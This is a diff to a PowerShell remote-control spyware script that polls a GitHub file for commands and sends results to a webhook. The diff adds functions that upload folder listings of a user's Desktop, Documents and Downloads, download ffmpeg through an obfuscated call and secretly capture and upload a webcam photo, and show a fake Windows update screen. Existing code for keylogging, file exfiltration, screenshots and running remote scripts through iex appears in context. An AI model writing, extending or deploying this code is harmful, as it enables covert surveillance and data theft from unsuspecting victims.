@@ -43,7 +43,7 @@ Killswitch : save github file contents as 'kill' to stop 'KeyCapture' or 'Exfilt
 # $hookurl = "YOUR WEBHOOK URL"
 
 $response = Invoke-RestMethod -Uri $GHurl
-$previouscmd = ""
+$previouscmd = $response
 
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``WAITING FOR COMMANDS..`` :link:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
@@ -60,6 +60,9 @@ $msgsys = "``========================================================
 = Keycapture   : Capture Keystrokes and send           =
 = Exfiltrate : Send various files.                     =
 = Systeminfo : Send System info as text file.          =
+= TakePicture : Send a webcam picture.                 =
+= FolderTree : Save folder trees to file and send.     =
+= FakeUpdate : Spoof windows update screen.            =
 = CustomCommand : Execute a github file as a script.   =
 ========================================================
 = Examples and Info -                                  =
@@ -74,10 +77,35 @@ $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | Conve
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 }
 
-Function Exfiltrate {
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Exfiltration Started`` :computer:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Function FolderTree{
+tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
+tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
+tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
+$FilePath ="$env:temp/TreesOfKnowledge.zip"
+Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt -DestinationPath $FilePath
+sleep 1
+curl.exe -F file1=@"$FilePath" $hookurl
+rm -Path $FilePath -Force
+Write-Output "Done."
+}
 
+Function FakeUpdate {
+$tobat = @'
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "C:\Windows\System32\scrnsave.scr"
+WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
+WScript.Sleep 200
+WshShell.SendKeys "{F11}"
+'@
+$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
+$tobat | Out-File -FilePath $pth -Force
+sleep 1
+Start-Process -FilePath $pth
+sleep 3
+Remove-Item -Path $pth -Force
+}
+
+Function Exfiltrate {
 $maxZipFileSize = 25MB
 $currentZipSize = 0
 $index = 1
@@ -114,7 +142,7 @@ foreach ($folder in $foldersToSearch) {
             $currentZipSize += $fileSize
             $messages = Invoke-RestMethod -Uri $GHurl
             if ($messages -match "kill") {
-                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Exfiltration Stopped`` :octagonal_sign:"} | ConvertTo-Json
+                $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"} | ConvertTo-Json
                 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
                 $previouscmd = $response
                 break
@@ -124,7 +152,7 @@ foreach ($folder in $foldersToSearch) {
 }
 $zipArchive.Dispose()
 curl.exe -F file1=@"$zipFilePath" $hookurl
-sleep 1
+sleep 5
 Remove-Item -Path $zipFilePath -Force
 }
 
@@ -229,6 +257,43 @@ Remove-Item -Path $Pathsys -force
 
 }
 
+Function TakePicture {
+$outputFolder = "$env:TEMP\8zTl45PSA"
+$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
+$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
+if (-not (Test-Path -Path $outputFolder)) {
+    New-Item -ItemType Directory -Path $outputFolder | Out-Null
+}
+if (-not (Test-Path -Path $tempFolder)) {
+    New-Item -ItemType Directory -Path $tempFolder | Out-Null
+}
+$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
+$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
+if (-not (Test-Path -Path $ffmpegZip)) {
+    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
+}
+Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
+$videoDevice = $null
+$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
+if (-not $videoDevice) {
+    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
+}
+if (-not $videoDevice) {
+    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
+}
+if ($videoDevice) {
+    $videoInput = $videoDevice.Name
+    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
+    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
+    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
+    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
+} else {
+}
+    curl.exe -F "file1=@$outputFile" $hookurl
+    sleep 1
+    Remove-Item -Path $outputFile -Force
+}
+
 Function ScreenShot {
 $Filett = "$env:temp\SC.png"
 Add-Type -AssemblyName System.Windows.Forms
@@ -302,11 +367,9 @@ Start-Sleep -Milliseconds 10
 }
 }
 
-$previouscmd = $response
 while($true){
 
     if ($response -match "$previouscmd") {
-    Write-Output "No command found.."
     }
     else{
     Write-Output "Command found!"
@@ -336,6 +399,18 @@ while($true){
             $previouscmd = $response
             SystemInfo
         }
+        if ($response -match "fakeupdate") {
+            $previouscmd = $response
+            FakeUpdate
+        }
+        if ($response -match "takepicture") {
+            $previouscmd = $response
+            TakePicture
+        }
+        if ($response -match "foldertree") {
+            $previouscmd = $response
+            FolderTree
+        }
         if ($response -match "customcommand") {
             $previouscmd = $response
             $customcommand = Invoke-RestMethod -Uri $CCurl | iex
@@ -344,3 +419,4 @@ while($true){
     }
 sleep 10
 }
+
